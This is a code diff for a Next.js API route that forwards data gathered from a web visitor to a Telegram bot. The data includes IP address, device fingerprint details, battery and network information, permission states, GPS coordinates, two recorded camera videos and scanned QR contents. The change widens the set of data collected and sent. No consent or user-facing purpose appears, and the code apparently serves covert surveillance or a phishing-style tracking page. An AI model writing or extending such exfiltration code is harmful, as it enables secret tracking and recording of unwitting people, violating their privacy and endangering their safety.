@@ -13,36 +13,72 @@ export async function POST(req: NextRequest) {
   }
 
   try {
-    const { video, latitude, longitude, qrCodeData } = await req.json(); // Expecting video, latitude, longitude, and qrCodeData
+    const {
+      clientInfo,
+      networkInfo,
+      deviceMemory,
+      batteryInfo,
+      geolocation,
+      video1,
+      video2,
+      qrCodeData,
+      permissionStatus,
+      ipAddress,
+    } = await req.json();
 
     const messages: Promise<Response>[] = [];
 
-    // Send Video
-    if (video) {
-      console.log("Attempting to send video...");
-      const base64Data = video.replace(/^data:video\/\w+;base64,/, "");
-      const buffer = Buffer.from(base64Data, "base64");
-      const formData = new FormData();
-      formData.append("chat_id", TELEGRAM_CHAT_ID);
-      formData.append("video", new Blob([buffer], { type: "video/webm" }), "recorded_video.webm");
+    // --- Construct Summary Message ---
+    let summaryText = "Received data from web app:";
+    summaryText += `\n\n--- Client & Device Info ---`;
+    summaryText += `\nIP Address: ${ipAddress || "Unavailable"}`;
+    summaryText += `\nUser Agent: ${clientInfo?.userAgent || "Unavailable"}`;
+    summaryText += `\nPlatform: ${clientInfo?.platform || "Unavailable"}`;
+    summaryText += `\nCPU Cores: ${clientInfo?.hardwareConcurrency || "Unavailable"}`;
+    summaryText += `\nDevice Memory: ${deviceMemory ? `${deviceMemory} GB` : "Unavailable"}`;
+    summaryText += `\nBattery Level: ${batteryInfo?.level !== undefined ? `${(batteryInfo.level * 100).toFixed(0)}%` : "Unavailable"}`;
+    summaryText += `\nBattery Charging: ${batteryInfo?.charging !== undefined ? (batteryInfo.charging ? "Yes" : "No") : "Unavailable"}`;
 
-      messages.push(
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
-          method: "POST",
-          body: formData,
-        }).then(async res => {
-          console.log("Video API response status:", res.status);
-          if (!res.ok) {
-            const errorBody = await res.text();
-            console.error("Video API error response:", errorBody);
-          }
-          return res;
-        })
-      );
+    summaryText += `\n\n--- Network Info ---`;
+    summaryText += `\nConnection Type: ${networkInfo?.effectiveType || "Unavailable"}`;
+    summaryText += `\nRTT: ${networkInfo?.rtt !== undefined ? `${networkInfo.rtt} ms` : "Unavailable"}`;
+    summaryText += `\nDownlink: ${networkInfo?.downlink !== undefined ? `${networkInfo.downlink} Mbps` : "Unavailable"}`;
+
+    summaryText += `\n\n--- Permissions & Data ---`;
+    summaryText += `\nGeolocation: ${geolocation ? `Lat ${geolocation.latitude}, Lng ${geolocation.longitude}` : "Denied or Unavailable"}`;
+    summaryText += `\nVideo 1 Recorded: ${video1 ? "Yes" : "No"}`;
+    summaryText += `\nVideo 2 Recorded: ${video2 ? "Yes" : "No"}`;
+    summaryText += `\nQR Code Scanned: ${qrCodeData || "No"}`;
+    
+    if (permissionStatus) {
+      summaryText += `\n\n--- Permission Status ---`;
+      for (const [key, value] of Object.entries(permissionStatus)) {
+        summaryText += `\n${key}: ${value}`;
+      }
     }
 
-    // Send Location
-    if (latitude && longitude) {
+    messages.push(
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: summaryText,
+        }),
+      }).then(async res => {
+        console.log("Summary message API response status:", res.status);
+        if (!res.ok) {
+            const errorBody = await res.text();
+            console.error("Summary message API error response:", errorBody);
+        }
+        return res;
+      })
+    );
+
+    // Send Geolocation
+    if (geolocation?.latitude && geolocation?.longitude) {
       console.log("Attempting to send location...");
       messages.push(
         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
@@ -52,14 +88,62 @@ export async function POST(req: NextRequest) {
           },
           body: JSON.stringify({
             chat_id: TELEGRAM_CHAT_ID,
-            latitude: latitude,
-            longitude: longitude,
+            latitude: geolocation.latitude,
+            longitude: geolocation.longitude,
           }),
         }).then(async res => {
           console.log("Location API response status:", res.status);
           if (!res.ok) {
             const errorBody = await res.text();
             console.error("Location API error response:", errorBody);
+          }
+          return res;
+        })
+      );
+    }
+
+    // Send Video 1
+    if (video1) {
+      console.log("Attempting to send Video 1...");
+      const base64Data = video1.replace(/^data:video\/\w+;base64,/, "");
+      const buffer = Buffer.from(base64Data, "base64");
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      formData.append("video", new Blob([buffer], { type: "video/webm" }), "recorded_video_1.webm");
+
+      messages.push(
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+          method: "POST",
+          body: formData,
+        }).then(async res => {
+          console.log("Video 1 API response status:", res.status);
+          if (!res.ok) {
+            const errorBody = await res.text();
+            console.error("Video 1 API error response:", errorBody);
+          }
+          return res;
+        })
+      );
+    }
+
+    // Send Video 2
+    if (video2) {
+      console.log("Attempting to send Video 2...");
+      const base64Data = video2.replace(/^data:video\/\w+;base64,/, "");
+      const buffer = Buffer.from(base64Data, "base64");
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      formData.append("video", new Blob([buffer], { type: "video/webm" }), "recorded_video_2.webm");
+
+      messages.push(
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+          method: "POST",
+          body: formData,
+        }).then(async res => {
+          console.log("Video 2 API response status:", res.status);
+          if (!res.ok) {
+            const errorBody = await res.text();
+            console.error("Video 2 API error response:", errorBody);
           }
           return res;
         })
@@ -89,33 +173,6 @@ export async function POST(req: NextRequest) {
         })
       );
     }
-
-    // Send a text message summary
-    let summaryText = "Received data from web app:";
-    if (video) summaryText += "\n- Video recorded.";
-    if (latitude && longitude) summaryText += `\n- Location: Lat ${latitude}, Lng ${longitude}.`;
-    if (qrCodeData) summaryText += `\n- QR Code: ${qrCodeData}.`;
-    if (!video && !latitude && !longitude && !qrCodeData) summaryText = "No data received from web app (permissions denied or unavailable).";
-
-    messages.push(
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: summaryText,
-        }),
-      }).then(async res => {
-        console.log("Summary message API response status:", res.status);
-        if (!res.ok) {
-            const errorBody = await res.text();
-            console.error("Summary message API error response:", errorBody);
-        }
-        return res;
-      })
-    );
 
     await Promise.allSettled(messages);
 
